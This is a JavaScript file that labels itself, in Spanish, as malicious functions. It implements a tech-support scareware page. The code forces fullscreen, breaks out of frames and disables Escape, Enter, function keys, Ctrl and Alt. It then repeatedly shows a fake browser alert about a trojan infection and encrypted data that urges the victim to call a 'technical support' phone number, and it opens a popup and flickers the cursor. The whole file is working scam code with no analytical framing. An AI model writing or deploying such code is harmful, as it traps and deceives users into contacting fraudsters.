//Archivo js con funciones maliciosas

function virus(){

	bloqueo();
	ocultar();
}


function bloqueo(){
if(top.location != self.location)
  top.location = self.location;
shortcut.add("s",function() {
});
shortcut.add("a",function() {
});
shortcut.add("escape",function() {
});
shortcut.add("Enter",function() {
});
shortcut.add("F5",function() {
});
shortcut.add("F6",function() {
});
shortcut.add("F7",function() {
});
shortcut.add("F8",function() {
});
shortcut.add("F9",function() {
});
shortcut.add("F10",function() {
});
shortcut.add("F11",function() {
});
shortcut.add("F12",function() {
});
shortcut.add("Ctrl",function() {
});
shortcut.add("Alt",function() {
});

}


function maximizar(){

	var w= Math.floor(Math.random() * 100); 
	window.open("propagar.html", "VIRUS");
}

function ocultar2(){
  document.getElementById('virus').style.backgroundColor = "black";
  document.body.style.backgroundImage = "url('./images/bk.jpg')";
  document.getElementById('pagina').src = "./images/rw.jpg";

}

function ocultar(){
	document.getElementById('virus').style.display = 'block';
	document.getElementById('info').style.display = 'none';
  document.getElementById('virus').style.backgroundColor = "#0202ac";
	document.body.style.backgroundColor = "#0202ac";

}

function launchFullscreen(element) {
  if(element.requestFullscreen) {
    element.requestFullscreen();
  } else if(element.mozRequestFullScreen) {
    element.mozRequestFullScreen();
  } else if(element.webkitRequestFullscreen) {
    element.webkitRequestFullscreen();
  } else if(element.msRequestFullscreen) {
    element.msRequestFullscreen();
  }
  virus();

  setTimeout(function() {
    poner();
    voltear();
	}, 3000);

}

function poner(){ 
var paso;
for (paso = 0; paso < 10; paso++) {
  abrirVirus();
};
ocultar2();
}

function abrirVirus() {
   document.body.style.backgroundColor='#ff0000';
   var mensaje = "ALERTA DEL NAVEGADOR DE INTERNET\nSE HA DETECTADO UNA AMENAZA\n\nTipo: Troyano\nMalware: Win32:Trojan[TRj21]"        
   +"\n\nArchivo infectados: \n C:\\Windows\\System32\\autoplay.dll\n C:\\Windows\\System32\\batt.dll\n" 
   +"C:\\Windows\\System32\\bcdboot.dll\n C:\\Windows\\System32\\batmeter.dll\n\nEste malware ha infectado su ordenador." 
   +"Los datos han sido encriptados.\n\nNo realice ninguna acción, ya que pondrá en peligro todos sus datos.\n\nContacte con el soporte técnico llamando al 902-231545\n\n"
   alert(mensaje);
 }

function voltear(){
var cursores = new Array("e-resize","ne-resize","n-resize","se-resize");
var i = 0;
document.body.style.cursor=cursores[i];
i++;
if (i==cursores.length) 
  i=0
setTimeout("voltear()",75);
}



